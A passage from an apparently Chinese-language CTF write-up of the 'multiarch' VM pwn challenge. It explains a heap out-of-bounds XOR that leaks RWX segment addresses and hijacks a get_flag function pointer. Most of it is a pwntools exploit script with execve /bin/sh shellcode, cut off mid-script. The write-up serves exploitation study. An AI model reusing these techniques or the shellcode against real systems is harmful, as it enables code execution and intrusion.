class="type">int</span>)result].chunk_ptr_calloc + a2 - v9;</span><br><span class="line">      LODWORD(result) = result + <span class="number">1</span>;</span><br><span class="line">      p_vm_addr += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (_DWORD)result != heap_cnt );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>既然可以越界去 xor，那是不是可以去 xor 原本 chunk address 成 <code>masm_struct</code><br>因為該 chunk 也是存在 heap 上的<br>並且那塊 chunk 只有低 1.5 bytes 不一樣，並且這 1.5 bytes 相同<br>所以這兩塊需要 xor 的值是固定的<br>將這塊 xor 成 <code>masm_struct</code> 後，通過 syscall 2 的 fwrite<br>就可以去 leak 相當多資料，其中我們需要的資料是 data 存放的實際位置<br>這是一塊通過 mmap 出來的記憶體</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seg1_load_ptr = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">masm-&gt;seg0 = seg1_load_ptr;</span><br><span class="line">seg2_load_ptr = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">masm-&gt;seg1 = seg2_load_ptr;</span><br><span class="line">masm-&gt;seg2 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>這三塊都是 rwx 權限，如果能夠把 shellcode 寫在上面(直接把 shellcode 放在 masm file data 段)<br>並且跳上去就可以 RCE 了<br>其中他有提供 syscall 5 會去 call 一個 <code>get_flag</code> 的 function pointer </p>
+<p>使用 register-arch 的 syscall 2 來去寫 pointer<br>把 register 1 設成 0xa000 (你第一次分配的位置，這塊已經在先前把實際位置改成了 <code>masm_struct</code>) + 0x28<br>當你去寫入他時候，他把 0xa028 轉換成 <code>masm_struct</code> + 0x28</p>
+<p>就可以去寫入了</p>
+<p>把他寫成 data mmap address 後<br>去 syscall 他就可以跳上去 shellcode 拿 shell 了</p>
+<p>VM 題目真的是逆向困難XD</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/Naupjjin/MyCTFLib/blob/main/MyPwnLib/smp_exploit.py</span></span><br><span class="line"><span class="comment"># pwn templates by naup96321</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x10 push imm (as byte)</span></span><br><span class="line"><span class="string">0x20 push imm (as word)</span></span><br><span class="line"><span class="string">0x30 push imm</span></span><br><span class="line"><span class="string">0x40 push [imm]</span></span><br><span class="line"><span class="string">0x50 pop</span></span><br><span class="line"><span class="string">0x60 pop A,B; push A+B</span></span><br><span class="line"><span class="string">0x61 same but A-B</span></span><br><span class="line"><span class="string">0x62 same but A^B</span></span><br><span class="line"><span class="string">0x63 same but A&amp;B</span></span><br><span class="line"><span class="string">0x70 jmp imm (does not pop A,B, instead checks cmp flag)</span></span><br><span class="line"><span class="string">0x71 jeq imm</span></span><br><span class="line"><span class="string">0x72 jne imm</span></span><br><span class="line"><span class="string">0x80 pop A,B; cmp A,B</span></span><br><span class="line"><span class="string">0xFF nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">arch_table = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_stack_arch_table</span>():</span><br><span class="line">    arch_table.extend([<span class="number">0</span>]*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_byte_stack</span>(<span class="params">imm</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x10</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_word_stack</span>(<span class="params">imm</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x20</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_dword_stack</span>(<span class="params">imm</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x30</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_addr_stack</span>():</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x40</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_stack</span>():</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x50</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_more_stack</span>(<span class="params">ops</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">if</span> ops == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x60</span>) + p32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> ops == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x61</span>) + p32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> ops == <span class="string">&quot;^&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x62</span>) + p32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> ops == <span class="string">&quot;&amp;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x63</span>) + p32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not support&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp_stack</span>(<span class="params">imm</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x70</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jeq_stack</span>(<span class="params">imm</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x71</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jne_stack</span>(<span class="params">imm</span>):</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x72</span>) + p32(imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_cmp_stack</span>():</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x80</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop_stack</span>():</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0xff</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">syscall_stack</span>():</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0xA0</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">syscall_regs</span>():</span><br><span class="line">    arch_table.extend([<span class="number">1</span>]*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_r0_regs</span>():</span><br><span class="line">    arch_table.extend([<span class="number">1</span>]*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x15</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_r1_regs</span>():</span><br><span class="line">    arch_table.extend([<span class="number">1</span>]*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_r2_regs</span>():</span><br><span class="line">    arch_table.extend([<span class="number">1</span>]*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">halt</span>():</span><br><span class="line">    set_stack_arch_table()</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x00</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_4bytes_regs</span>(<span class="params">idx, xor_num</span>):</span><br><span class="line">    arch_table.extend([<span class="number">1</span>]*<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x41</span>) + p8(idx) + p32(xor_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitlist_to_bytes</span>(<span class="params">bits: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="built_in">bytearray</span>((<span class="built_in">len</span>(bits) + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(bits):</span><br><span class="line">        <span class="keyword">if</span> bit:</span><br><span class="line">            result[i &gt;&gt; <span class="number">3</span>] |= <span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="string">Addr: 0x55555555c570</span></span><br><span class="line"><span class="string">Size: 0x90 (with flag bits: 0x91)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="string">Addr: 0x55555555c600</span></span><br><span class="line"><span class="string">Size: 0x20 (with flag bits: 0x21)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="string">Addr: 0x55555555c620</span></span><br><span class="line"><span class="string">Size: 0x210 (with flag bits: 0x211)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">00000000 struct __attribute__((packed)) masm_struct // sizeof=0x88</span></span><br><span class="line"><span class="string">00000000 &#123;</span></span><br><span class="line"><span class="string">00000000     void *seg0;</span></span><br><span class="line"><span class="string">00000008     void *seg1;</span></span><br><span class="line"><span class="string">00000010     void *seg2;</span></span><br><span class="line"><span class="string">00000018     void *arch;</span></span><br><span class="line"><span class="string">00000020     uint64_t seg2_size;</span></span><br><span class="line"><span class="string">00000028     void (*get_flag)();</span></span><br><span class="line"><span class="string">00000030     char error_flag;</span></span><br><span class="line"><span class="string">00000031     char whether_can_run_unknow_syscall;</span></span><br><span class="line"><span class="string">00000032     char cmp_flag;</span></span><br><span class="line"><span class="string">00000033     uint32_t pc;</span></span><br><span class="line"><span class="string">00000037     uint32_t sp;</span></span><br><span class="line"><span class="string">0000003B     uint32_t registers[4];</span></span><br><span class="line"><span class="string">0000004B     HeapSegment heap_array_5[5];</span></span><br><span class="line"><span class="string">00000087     unsigned __int8 heap_cnt;</span></span><br><span class="line"><span class="string">00000088 &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">00000000 struct __attribute__((packed)) HeapSegment // sizeof=0xC</span></span><br><span class="line"><span class="string">00000000 &#123;                                       // XREF: masm_struct/r</span></span><br><span class="line"><span class="string">00000000     void *chunk_ptr_calloc;</span></span><br><span class="line"><span class="string">00000008     int vm_addr;</span></span><br><span class="line"><span class="string">0000000C &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">00000000 struct segment_t // sizeof=0x30</span></span><br><span class="line"><span class="string">00000000 &#123;</span></span><br><span class="line"><span class="string">00000000     void *seg0_ptr;</span></span><br><span class="line"><span class="string">00000008     __int64 seg0_size;</span></span><br><span class="line"><span class="string">00000010     void *seg1_ptr;</span></span><br><span class="line"><span class="string">00000018     __int64 seg1_size;</span></span><br><span class="line"><span class="string">00000020     void *seg2_ptr;</span></span><br><span class="line"><span class="string">00000028     __int64 seg2_size;</span></span><br><span class="line"><span class="string">00000030 &#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">xor_value_between_VM_and_calloc = (<span class="number">0x55555555c620</span> + <span class="number">0x10</span>) ^ (<span class="number">0x55555555c570</span> + <span class="number">0x10</span>)</span><br><span class="line">masm_struct_size = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line">masm_exploit = <span class="string">&quot;exploit.masm&quot;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall 6, calloc 0x200 on vm addr 0xa000</span></span><br><span class="line">code += push_dword_stack(<span class="number">0xa000</span>)</span><br><span class="line">code += push_byte_stack(<span class="number">6</span>)</span><br><span class="line">code += syscall_stack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor calloc pointer to masm struct pointer start</span></span><br><span class="line">code += xor_4bytes_regs(<span class="number">0x50</span> , xor_value_between_VM_and_calloc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fwrite masm struct leak mmap address</span></span><br><span class="line">code += push_byte_stack(masm_struct_size)</span><br><span class="line">code += push_dword_stack(<span class="number">0xa000</span>)</span><br><span class="line">code += push_byte_stack(<span class="number">2</span>)</span><br><span class="line">code += syscall_stack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># read_f(stdin,[reg[1]],reg[2])</span></span><br><span class="line"><span class="comment"># regs0 --&gt; 1 syscall number</span></span><br><span class="line"><span class="comment"># regs1 --&gt; addr</span></span><br><span class="line"><span class="comment"># regs2 --&gt; size</span></span><br><span class="line"></span><br><span class="line">code += push_dword_stack(<span class="number">1</span>)</span><br><span class="line">code += pop_r0_regs()</span><br><span class="line">code += push_dword_stack(<span class="number">0xa000</span> + <span class="number">0x28</span>)</span><br><span class="line">code += pop_r1_regs()</span><br><span class="line">code += push_dword_stack(<span class="number">0x8</span>)</span><br><span class="line">code += pop_r2_regs()</span><br><span class="line">code += syscall_regs()</span><br><span class="line"></span><br><span class="line">code += push_byte_stack(<span class="number">5</span>)</span><br><span class="line">code += syscall_stack()</span><br><span class="line"></span><br><span class="line">code += xor_4bytes_regs(<span class="number">0x50</span> , xor_value_between_VM_and_calloc)</span><br><span class="line"></span><br><span class="line">code += halt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################</span></span><br><span class="line"><span class="comment"># make data seg</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">data = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># make arch table</span></span><br><span class="line">arch = bitlist_to_bytes(arch_table)</span><br><span class="line"></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"></span><br><span class="line">magic = <span class="string">b&#x27;MASM&#x27;</span></span><br><span class="line"></span><br><span class="line">code_offset = <span class="number">0x20</span></span><br><span class="line">data_offset = code_offset + <span class="built_in">len</span>(code)</span><br><span class="line">arch_offset = data_offset + <span class="built_in">len</span>(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code len : &quot;</span>, <span class="built_in">len</span>(code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Data len : &quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Tran len : &quot;</span>, <span class="built_in">len</span>(arch))</span><br><span class="line"></span><br><span class="line">seg_headers = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 0x1000 - 0x1FFF: Code Segment (Segment 1)</span></span><br><span class="line">seg_headers += p8(<span class="number">1</span>) + p16(code_offset) + p16(<span class="built_in">len</span>(code))</span><br><span class="line"><span class="comment"># 0x2000 - 0x2FFF: Data Segment (Segment 2, based on updated code)</span></span><br><span class="line">seg_headers += p8(<span class="number">2</span>) + p16(data_offset) + p16(<span class="built_in">len</span>(data))</span><br><span class="line"><span class="comment"># 0x8000 - 0x8FFF: arch Table (Segment 3)</span></span><br><span class="line">seg_headers += p8(<span class="number">3</span>) + p16(arch_offset) + p16(<span class="built_in">len</span>(arch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(masm_exploit, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(magic)</span><br><span class="line">    f.write(seg_headers)</span><br><span class="line"></span><br><span class="line">    f.write(<span class="string">b&#x27;\x00&#x27;</span> * (code_offset - f.tell()))</span><br><span class="line">    f.write(code)</span><br><span class="line">    f.write(data)</span><br><span class="line">    f.write(arch)</span><br><span class="line"></span><br><span class="line">aaa = <span class="built_in">input</span>(<span class="string">&quot;Start process?(y/n)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> aaa == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r = process([<span class="string">&quot;./multiarch&quot;</span>, <span class="string">&quot;exploit.masm&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># exploit</span></span><br><span class="line">    rcu(<span class="string">b&quot;[I] executing program\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    00000000 struct __attribute__((packed)) masm_struct // sizeof=0x88</span></span><br><span class="line"><span class="string">    00000000 &#123;</span></span><br><span class="line"><span class="string">    00000000     void *seg0;</span></span><br><span class="line"><span class="string">    00000008     void *seg1;</span></span><br><span class="line"><span class="string">    00000010     void *seg2;</span></span><br><span class="line"><span class="string">    00000018     void *arch;</span></span><br><span class="line"><span class="string">    00000020     uint64_t seg2_size;</span></span><br><span class="line"><span class="string">    00000028     void (*get_flag)();</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    leak = rc(<span class="number">0x88</span>)</span><br><span class="line">    struct_seg0 = u64(leak[<span class="number">0</span>:<span class="number">0x8</span>])</span><br><span class="line">    struct_seg1 = u64(leak[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">    struct_seg2 = u64(leak[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">    struct_arch = u64(leak[<span class="number">0x18</span>:<span class="number">0x20</span>])</span><br><span class="line">    struct_seg2_size = u64(leak[<span class="number">0x20</span>:<span class="number">0x28</span>])</span><br><span class="line">    struct_get_flag_ptr = u64(leak[<span class="number">0x28</span>:<span class="number">0x30</span>])</span><br><span class="line">    struct_pc = u32(leak[<span class="number">0x33</span>: <span class="number">0x33</span> + <span class="number">0x4</span>])</span><br><span class="line">    struct_sp = u32(leak[<span class="number">0x37</span>: <span class="number">0x37</span> + <span class="number">0x4</span>])</span><br><span class="line">    struct_regs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        struct_regs.append(u32(leak[<span class="number">0x3b</span> + <span class="number">0x4</span>*i: <span class="number">0x3b</span> + <span class="number">0x4</span> + <span class="number">0x4</span>*i]))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SEG0: &quot;</span>, <span class="built_in">hex</span>(struct_seg0))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SEG1: &quot;</span>, <span class="built_in">hex</span>(struct_seg1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SEG2: &quot;</span>, <span class="built_in">hex</span>(struct_seg2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SEG2 SIZE: &quot;</span>, <span class="built_in">hex</span>(struct_seg2_size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;GET FLAG: &quot;</span>, <span class="built_in">hex</span>(struct_get_flag_ptr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PC: &quot;</span>, <span 